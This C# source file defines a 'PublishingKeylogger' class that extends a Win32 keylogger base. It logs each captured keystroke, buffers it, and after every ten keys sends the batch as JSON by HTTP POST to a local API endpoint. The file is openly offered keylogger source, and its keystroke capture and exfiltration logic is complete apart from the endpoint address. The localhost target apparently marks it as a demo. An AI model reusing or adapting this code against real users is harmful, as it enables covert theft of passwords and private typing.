using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;
using CodeReactions.Messages;
using Newtonsoft.Json;

namespace CodeReactions.Keylogger
{
	public sealed class PublishingKeylogger
		: Win32Keylogger
	{
		private List<char> cachedKeys;

		public PublishingKeylogger()
			: base()
		{
			this.cachedKeys = new List<char>();
		}

		protected override void HandleKey(Keys key)
		{
			Console.Out.WriteLine(key);
			this.cachedKeys.Add(Convert.ToChar((int)key));

			if (this.cachedKeys.Count >= 10)
			{
				var request = new KeyloggerMessage { Keys = this.cachedKeys.ToArray() };
				var message = JsonConvert.SerializeObject(request, Formatting.Indented);
				var content = new StringContent(message,
					Encoding.Unicode, "application/json");
				var postResponse = new HttpClient().PostAsync("http://localhost:22503/api/keylogger", content);
				postResponse.Wait();

				this.cachedKeys.Clear();
			}
		}
	}
}
